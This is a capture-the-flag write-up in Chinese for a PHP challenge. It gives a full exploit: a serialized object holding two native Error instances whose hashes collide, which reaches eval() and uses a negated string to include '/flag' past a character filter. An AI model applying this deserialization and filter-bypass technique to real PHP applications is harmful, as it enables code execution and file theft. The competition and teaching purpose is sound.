# greatphp 官方wp

这里直接丢个exp,考点是md5/sha1可以对一个类进行hash,会触发一个类的__toString方法,这里由于没有可以利用的类,所以需要寻找原生类,比如Error,Exception等,然后由于Error的toString是无法完全控制的,会有其他输出,所以使用?><?=的方式结束php从而完整控制整块代码,(这里有个坑就是Error必须不等,但toString生成的结果必须相等,由于toString生成的结果包含当前代码所在的行,所以新生成的2个实例必须在同一行),因为禁用了小括号无法调用函数,尝试直接include "/flag"即可.

```php
<?php

class SYCLOVER {
	public $syc;
	public $lover;
	public function __wakeup(){
		if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
		   if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->var1, $match)){
			   eval($this->syc);
		   } else {
			   die("Try Hard !!");
		   }
		   
		}
	}
}

$str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!".urldecode("%FF")."]?>";
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));

?>

```

